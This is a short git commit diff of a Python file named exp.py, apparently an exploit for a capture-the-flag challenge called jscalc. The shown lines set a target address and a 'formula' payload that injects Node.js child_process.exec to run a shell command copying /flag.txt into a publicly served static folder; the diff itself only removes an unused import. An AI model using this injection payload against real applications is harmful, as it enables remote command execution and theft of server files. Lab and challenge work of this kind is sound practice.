b3df2f4c7e21f8c89da5aacb9244a979c383a31f
Rh4P50Dy <71578371+rh4p50dy@users.noreply.github.com>
2024-05-14 09:57:37 +0630

    create exp.py

--- jscalc/exp.py
+++ jscalc/exp.py
@@ -1,5 +1,4 @@
 import requests
-from bs4 import BeautifulSoup as bs
 
 url = "http://94.237.62.195:45843"
 data = {"formula":"require(\"child_process\").exec(\"cat /flag.txt > /app/static/css/ok.txt\")"}
